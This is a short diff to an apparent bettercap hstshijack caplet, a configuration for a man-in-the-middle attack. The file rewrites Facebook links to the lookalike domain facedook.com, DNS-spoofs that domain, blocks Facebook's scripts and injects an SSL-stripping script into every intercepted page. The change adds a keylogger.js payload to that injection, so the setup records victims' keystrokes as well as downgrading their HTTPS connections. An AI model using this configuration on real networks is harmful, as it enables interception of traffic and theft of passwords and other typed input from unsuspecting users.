@@ -8,7 +8,7 @@ set hstshijack.replacements    facedook.com,*.facedook.com
 set hstshijack.blockscripts    facebook.com,*.facebook.com
 set hstshijack.obfuscate       false
 set hstshijack.encode          true
-set hstshijack.custompayloads  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js
+set hstshijack.custompayloads  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
 
 set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
 set dns.spoof.domains  facedook.com,*.facedook.com
